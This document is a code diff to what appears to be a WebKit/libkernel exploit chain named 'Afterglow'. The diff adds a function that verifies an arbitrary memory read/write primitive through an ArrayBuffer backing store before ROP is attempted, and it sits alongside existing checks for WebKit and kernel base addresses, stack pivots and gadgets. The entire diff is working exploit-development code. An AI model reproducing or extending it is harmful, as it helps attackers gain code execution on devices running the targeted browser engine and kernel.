@@ -83,6 +83,29 @@ function afterglow_hex(bytes) {
   return Array.from(bytes, (b) => b.toString(16).padStart(2, '0')).join(' ');
 }
 
+// Exercise the ARW through the same ArrayBuffer backing-store path Afterglow
+// uses for bufAddr(). If this round trip fails, the primitive is not usable and
+// we stop before any ROP.
+function afterglow_check_arw() {
+  const u8 = new Uint8Array(0x100);
+  u8[0] = 0x41;
+  u8[1] = 0x42;
+
+  const at = u8.buffer.data();
+  if (at.eq(0)) throw new Error('ArrayBuffer backing store is zero');
+
+  if (arw.view(at).getUint8(0) !== 0x41) {
+    throw new Error('ARW read did not return the ArrayBuffer contents');
+  }
+
+  arw.view(at).setUint8(0, 0x42);
+  if (u8[0] !== 0x42) {
+    throw new Error('ARW write did not reach the ArrayBuffer');
+  }
+
+  logger.info('ARW round-trip OK');
+}
+
 // Rebuild the WebKit base the same way rop.init() does, but before rop.init()
 // has a chance to scan libkernel with a bad address. Returns the base.
 function afterglow_precheck_webkit_base() {
@@ -371,6 +394,7 @@ function make_afterglow_ctx(options) {
 globalThis.afterglow_precheck_webkit_base = afterglow_precheck_webkit_base;
 globalThis.afterglow_precheck_kernel_bases = afterglow_precheck_kernel_bases;
 globalThis.afterglow_precheck_pivot = afterglow_precheck_pivot;
+globalThis.afterglow_check_arw = afterglow_check_arw;
 globalThis.afterglow_validate_gadgets = afterglow_validate_gadgets;
 globalThis.afterglow_validate_bases = afterglow_validate_bases;
 globalThis.make_afterglow_ctx = make_afterglow_ctx;
